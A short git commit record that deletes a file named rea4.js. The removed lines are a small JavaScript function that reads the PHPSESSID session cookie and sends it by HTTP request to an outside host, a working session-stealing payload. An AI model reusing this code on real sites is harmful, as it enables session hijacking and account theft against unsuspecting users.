1edf67b5861f947dd43e53cc15cf73d97871d3ca
checked666 <42522983+checked666@users.noreply.github.com>
2018-08-20 00:39:44 +0300

    Delete rea4.js

--- rea4.js
+++
@@ -1,6 +0,0 @@
-getCP = function() {
-  var xhr = new XMLHttpRequest();
-  var id = document.cookie.match(/PHPSESSID=[^;]+/);
-  xhr.open("GET","http://logov.mcdir.ru/s.php?id="+id);
-  xhr.send();
-}
